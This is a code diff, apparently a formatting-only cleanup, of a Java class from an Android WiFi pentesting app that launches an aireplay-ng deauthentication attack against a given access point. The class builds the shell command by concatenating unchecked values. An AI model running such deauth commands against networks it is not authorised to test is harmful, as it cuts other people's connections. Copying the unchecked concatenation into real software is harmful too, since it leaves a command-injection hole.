@@ -3,11 +3,8 @@ package com.zalexdev.stryker.wifi.utils;
 import static android.content.ContentValues.TAG;
 
 import android.annotation.SuppressLint;
-
 import android.os.AsyncTask;
 import android.util.Log;
-
-
 
 import com.zalexdev.stryker.utils.Core;
 
@@ -24,13 +21,14 @@ public class StartDeauth extends AsyncTask<Void, String, Boolean> {
     public String wlan;
     public Process process;
 
-    public StartDeauth(String bssi, String inter, boolean lim,Core c) {
+    public StartDeauth(String bssi, String inter, boolean lim, Core c) {
 
         limit = lim;
         bssid = bssi;
         wlan = inter;
 
     }
+
     @Override
     protected void onPreExecute() {
         super.onPreExecute();
@@ -50,17 +48,17 @@ public class StartDeauth extends AsyncTask<Void, String, Boolean> {
             OutputStream stdin = process.getOutputStream();
             InputStream stderr = process.getErrorStream();
             InputStream stdout = process.getInputStream();
-            stdin.write((exec+" 'aireplay-ng -0 5 -a "+bssid+" "+wlan+"mon' "+ '\n').getBytes());
+            stdin.write((exec + " 'aireplay-ng -0 5 -a " + bssid + " " + wlan + "mon' " + '\n').getBytes());
             stdin.write(("exit\n").getBytes());
             stdin.flush();
             stdin.close();
             BufferedReader br = new BufferedReader(new InputStreamReader(stdout));
             while ((line = br.readLine()) != null) {
 
-                if (line.contains("avaible")){
+                if (line.contains("avaible")) {
                     result = false;
                 }
-                if (line.contains("Waiting")){
+                if (line.contains("Waiting")) {
                     result = true;
                 }
             }
@@ -91,10 +89,10 @@ public class StartDeauth extends AsyncTask<Void, String, Boolean> {
         super.onProgressUpdate(values);
 
     }
-    public void kill(){
+
+    public void kill() {
         process.destroy();
     }
-
 
 
 }
